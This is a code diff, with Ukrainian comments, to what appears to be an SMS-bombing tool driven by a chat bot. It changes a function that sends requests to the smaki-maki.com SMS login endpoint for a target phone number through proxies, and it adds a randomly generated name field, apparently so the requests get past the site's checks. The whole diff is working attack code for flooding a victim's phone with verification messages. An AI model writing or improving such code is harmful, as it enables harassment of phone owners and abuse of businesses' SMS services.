@@ -1353,9 +1353,12 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     
     # Додаємо smaki-maki окремо з логуванням
     if smaki_session_id:
-        logging.info(f"Додаю запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}")
+        # Генеруємо випадкове ім'я з англійських букв (5-10 символів)
+        random_name_length = random.randint(5, 10)
+        random_name = ''.join(random.choices(string.ascii_letters, k=random_name_length))
+        logging.info(f"Додаю запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name}")
         tasks.append(
-            bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": "", "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
+            bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
         )
     else:
         logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
